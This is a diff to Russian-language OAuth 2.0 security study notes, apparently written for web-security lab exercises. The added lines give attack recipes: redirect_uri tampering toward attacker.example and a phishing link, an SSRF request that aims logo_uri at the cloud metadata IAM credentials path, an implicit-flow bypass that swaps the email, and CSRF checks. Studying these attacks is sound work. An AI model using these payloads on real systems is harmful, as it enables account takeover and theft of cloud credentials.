@@ -26,7 +26,7 @@ GET /authorization?
     redirect_uri=https://client-app.com/callback& # должно проверять это поле по списку допустимых URL иначе open redirect attack
     response_type=code&     # если code > OAuth flow; если token OAuth authentication либо это Implicit flow
     scope=openid%20profile& # запрашиваемый скоуп
-    state=ae13d489bd00e3c24 # обязательный параметр для защиты от CSRF
+    state=ae13d489bd00e3c24 # или nonce - обязательный параметр для защиты от CSRF
     + со стороны бэка может быть добавлено поле client_secret
 Host: oauth-authorization-server.com # название сервера OAuth 
 
@@ -69,15 +69,27 @@ Host: oauth-authorization-server.com
 - атака authorization code injection attack
 - выставляются большие значения для кеша в браузере
 
-4. Ошибки на сервере клиента (resource owner)
+4. Ошибки на сервере клиента (resource server)
 - проверка токенов по клейму aud (что к ним пришел access token от их клиента, а не используется чужой access token)
 
 ### Best Current Practice for OAuth 2.0 Security (RFC 9700)
 https://datatracker.ietf.org/doc/rfc9700/
 
-1. Redirect URI Validation Attacks on Authorization Code Grant
+1. Open redirection attack
 Если на сервере настроены такие правила валидации https://*.somesite.example/*. Чтобы  https://app1.somesite.example/redirect смог работать. Но атакующий может заменить адрес на
 https://attacker.example/.somesite.example/
+> найти запрос авторизации /auth?client_id=[...] и отправить в Repeater
+> подменить значение redirect_uri:
+    A. подменить значение redirect_uri на свой домен с подстановкой домена жертвы как своего URI
+    redirect_uri=https://attacker.example/.somesite.example/
+    B. parameter pollution
+    redirect_uri=https://somesite.example/&redirect_uri=https://attacker.example/.somesite.example/
+    C. @
+    redirect_uri=https://somesite.example@https://attacker.example/.somesite.example/
+    D.  open redirect. На сайте нужно найти эндпоинт осущесвляющий редирект на другую страницу https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1 подменить значение redirect_uri     
+    redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit
+
+> отправить жертве подготовленную ссылку (phishing)
 
 2. Authorization Code Injection
 Если злоумышленник получил authorization code, то он может раньше клиента обратиться за получением access токена
@@ -88,3 +100,32 @@ https://attacker.example/.somesite.example/
 Защита - проверка at_hash claim
 
 4. PKCE Downgrade Attack
+
+5. SSRF via client registration
+Проверить https[:]//oauth-ID.oauth-server.net/.well-known/openid-configuration
+> найти registration_endpoint /reg на сервере авторизации
+> создать и зарегистрировать своего клиента. 
+> проверить гипотезу что при создании клиента есть некий URL от защищенного ресурса. Например "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/" 
+    POST /reg HTTP/1.1
+    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+    Content-Type: application/json
+
+    {
+        "redirect_uris" : [
+            "https://example.com"
+        ],
+        "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+    }
+> Сделать запрос к защищенной странице GET /client/{CLIENT_ID}/logo HTTP/2 на client id только что созданного клиента, который дасть доступ к закрытой информации
+
+6. Authentication bypass via OAuth implicit flow
+> Модифицировать запрос POST /authenticate 
+{"email":"wiener@hotdog.com","username":"wiener","token":"X009bmC5Z8m9JPKw_9Ow1-V_r0UIOnVmCFbOkt4QIA7"}
+ На POST /authenticate 
+{"email":"carlos@carlos-montoya.net","username":"wiener","token":"X009bmC5Z8m9JPKw_9Ow1-V_r0UIOnVmCFbOkt4QIA7"}
+
+7. CSRF
+> если нет state, nonce, PKCE
+> если есть state, nonce
+убрать, заменить на другое значение и проверить
+> если есть PKCE
